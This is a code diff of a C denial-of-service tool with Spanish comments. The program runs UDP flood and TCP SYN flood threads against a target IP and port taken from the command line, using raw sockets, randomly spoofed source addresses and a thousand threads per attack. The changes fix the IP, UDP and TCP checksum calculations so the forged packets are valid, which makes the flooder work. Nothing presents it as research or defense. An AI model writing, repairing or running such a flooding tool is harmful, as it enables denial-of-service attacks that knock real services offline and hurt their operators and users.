@@ -11,6 +11,7 @@
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
+#include <netinet/tcp.h> // Cabecera crucial para struct tcphdr
 #include <arpa/inet.h>
 
 #define MAX_PACKET_SIZE 1472 // Tamaño máximo de payload UDP
@@ -83,49 +84,50 @@ void *udp_flood_thread(void *args) {
     ip->ihl = 5;
     ip->version = 4;
     ip->tos = 0;
-    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr));
+    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + (MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr)));
     ip->id = htonl(54321);
     ip->frag_off = 0;
     ip->ttl = 255;
     ip->protocol = IPPROTO_UDP;
     ip->saddr = random(); // IP fuente aleatoria
     ip->daddr = sin.sin_addr.s_addr;
-    ip->check = csum((unsigned short *)buffer, ip->tot_len >> 1);
 
     // Llenar cabecera UDP
     udp->source = htons(random() % 65535);
     udp->dest = htons(a->target_port);
-    udp->len = htons(sizeof(struct udphdr) + MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr));
-    
-    // Llenar pseudo cabecera para checksum UDP
-    pheader.source_address = ip->saddr;
-    pheader.dest_address = ip->daddr;
-    pheader.placeholder = 0;
-    pheader.protocol = IPPROTO_UDP;
-    pheader.udp_length = udp->len;
-
-    // Calcular checksum UDP
-    char *udp_checksum_data = malloc(sizeof(struct pseudo_header) + sizeof(struct udphdr) + MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr));
-    memcpy(udp_checksum_data, &pheader, sizeof(struct pseudo_header));
-    memcpy(udp_checksum_data + sizeof(struct pseudo_header), udp, sizeof(struct udphdr));
-    udp->check = csum((unsigned short *)udp_checksum_data, sizeof(struct pseudo_header) + sizeof(struct udphdr) + MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphar));
-    free(udp_checksum_data);
+    udp->len = htons(sizeof(struct udphdr) + (MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr)));
 
     // Llenar payload con datos aleatorios
-    for (int i = 0; i < MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr); ++i) {
-        buffer[sizeof(struct iphdr) + sizeof(struct udphdr) +i] = random() % 255;
+    char *payload = buffer + sizeof(struct iphdr) + sizeof(struct udphdr);
+    int payload_size = MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr);
+    for (int i = 0; i < payload_size; ++i) {
+        payload[i] = random() % 255;
     }
 
     // Bucle de envío brutal
     while (time(NULL) - start_time < a->duration) {
         ip->saddr = random(); // Cambiar IP fuente en cada paquete
         ip->id = random();
+        ip->check = 0; // Resetear checksum antes de recalcular
+        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));
+
         udp->source = htons(random() % 65535);
-        ip->check = csum((unsigned short *)buffer, ip->tot_len >> 1);
-        udp->check = csum((unsigned short *)udp_checksum_data, sizeof(struct pseudo_header) + sizeof(struct udphdr) + MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr));
+        udp->check = 0; // Resetear checksum antes de recalcular
+        
+        // Calcular checksum UDP
+        pheader.source_address = ip->saddr;
+        pheader.dest_address = ip->daddr;
+        pheader.placeholder = 0;
+        pheader.protocol = IPPROTO_UDP;
+        pheader.udp_length = udp->len;
+
+        char udp_checksum_data[sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_size];
+        memcpy(udp_checksum_data, &pheader, sizeof(struct pseudo_header));
+        memcpy(udp_checksum_data + sizeof(struct pseudo_header), udp, sizeof(struct udphdr));
+        memcpy(udp_checksum_data + sizeof(struct pseudo_header) + sizeof(struct udphdr), payload, payload_size);
+        udp->check = csum((unsigned short *)udp_checksum_data, sizeof(udp_checksum_data));
         
         if (sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            // perror("sendto() error");
             // No imprimir errores para no ralentizar el hilo
         }
     }
@@ -180,22 +182,32 @@ void *syn_flood_thread(void *args) {
     tcp->check = 0;
     tcp->urg_ptr = 0;
 
-    // Calcular checksums
-    ip->check = csum((unsigned short *)buffer, ip->tot_len >> 1);
-    tcp->check = csum((unsigned short *)buffer, ip->tot_len >> 1);
-
     // Bucle de envío
     while (time(NULL) - start_time < a->duration) {
         ip->saddr = random();
         ip->id = random();
+        ip->check = 0; // Resetear checksum
+        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr));
+
         tcp->seq = htonl(random());
         tcp->source = htons(random() % 65535);
+        tcp->check = 0; // Resetear checksum
         
-        ip->check = csum((unsigned short *)buffer, ip->tot_len >> 1);
-        tcp->check = csum((unsigned short *)buffer, ip->tot_len >> 1);
+        // Calcular checksum TCP
+        struct pseudo_header pheader_tcp;
+        pheader_tcp.source_address = ip->saddr;
+        pheader_tcp.dest_address = ip->daddr;
+        pheader_tcp.placeholder = 0;
+        pheader_tcp.protocol = IPPROTO_TCP;
+        pheader_tcp.udp_length = htons(sizeof(struct tcphdr));
+        
+        char tcp_checksum_data[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
+        memcpy(tcp_checksum_data, &pheader_tcp, sizeof(struct pseudo_header));
+        memcpy(tcp_checksum_data + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));
+        tcp->check = csum((unsigned short *)tcp_checksum_data, sizeof(tcp_checksum_data));
         
         if (sendto(sd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            // perror("sendto() error");
+            // No imprimir errores para no ralentizar el hilo
         }
     }
     
@@ -208,8 +220,7 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "Uso: %s <IP> <PUERTO> <DURACION_SEGUNDOS>\n", argv[0]);
         exit(1);
     }
-
-    char *target_ip = argv[1];
+char *target_ip = argv[1];
     int target_port = atoi(argv[2]);
     int duration = atoi(argv[3]);
     int num_threads = 1000; // Número de hilos para cada tipo de ataque
